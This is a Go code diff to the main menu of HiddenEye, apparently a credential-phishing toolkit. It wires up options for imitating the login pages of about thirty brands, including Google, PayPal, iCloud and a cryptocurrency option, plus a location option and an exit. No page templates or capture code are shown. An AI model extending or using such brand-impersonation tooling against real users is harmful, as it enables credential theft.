@@ -6,6 +6,7 @@ import (
 	helpers "HiddenEye/helpers"
 	Colors "HiddenEye/utils"
 	"fmt"
+	"os"
 )
 
 func Hidden_Eye() {
@@ -100,8 +101,73 @@ func Hidden_Eye() {
 	option := helpers.Input_User(1, 34)
 
 	if option == 1 {
-		Facebook.Facebook()
+		Facebook.Facebook("Facebook")
+	} else if option == 2 {
+		Facebook.Facebook("Google")
+	} else if option == 3 {
+		Facebook.Facebook("LinkedIn")
+	} else if option == 4 {
+		Facebook.Facebook("Github")
+	} else if option == 5 {
+		Facebook.Facebook("StackOverflow")
+	} else if option == 6 {
+		Facebook.Facebook("WordPress")
+	} else if option == 7 {
+		Facebook.Facebook("Instagram")
+	} else if option == 8 {
+		Facebook.Facebook("Twitter")
+	} else if option == 9 {
+		Facebook.Facebook("Snapchat")
+	} else if option == 10 {
+		Facebook.Facebook("Yahoo")
+	} else if option == 11 {
+		Facebook.Facebook("Twitch")
+	} else if option == 12 {
+		Facebook.Facebook("Microsoft")
+	} else if option == 13 {
+		Facebook.Facebook("Steam")
+	} else if option == 14 {
+		Facebook.Facebook("iCloud")
+	} else if option == 15 {
+		Facebook.Facebook("Gitlab")
+	} else if option == 16 {
+		Facebook.Facebook("Netflix")
+	} else if option == 17 {
+		Facebook.Facebook("Pinterest")
+	} else if option == 18 {
+		Facebook.Facebook("Origin")
+	} else if option == 19 {
+		Facebook.Facebook("ProtonMail")
+	} else if option == 20 {
+		Facebook.Facebook("Spotify")
+	} else if option == 21 {
+		Facebook.Facebook("Quora")
+	} else if option == 22 {
+		Facebook.Facebook("Adobe")
+	} else if option == 23 {
+		Facebook.Facebook("Cryptocurrency")
+	} else if option == 24 {
+		Facebook.Facebook("DevianArt")
+	} else if option == 25 {
+		Facebook.Facebook("DropBox")
+	} else if option == 26 {
+		Facebook.Facebook("eBay")
+	} else if option == 27 {
+		Facebook.Facebook("Paypal")
+	} else if option == 28 {
+		Facebook.Facebook("Verizon")
+	} else if option == 29 {
+		Facebook.Facebook("Reddit")
+	} else if option == 30 {
+		Facebook.Facebook("Playstation")
+	} else if option == 31 {
+		Facebook.Facebook("XBOX")
+	} else if option == 32 {
+		Facebook.Facebook("Custom")
 	} else if option == 33 {
 		Location.Get_Location()
+	} else if option == 34 {
+		fmt.Println(Colors.Red(), "\n\n[!]", Colors.White(), " HiddenEye is closed sucessfully")
+		os.Exit(1)
 	}
 }
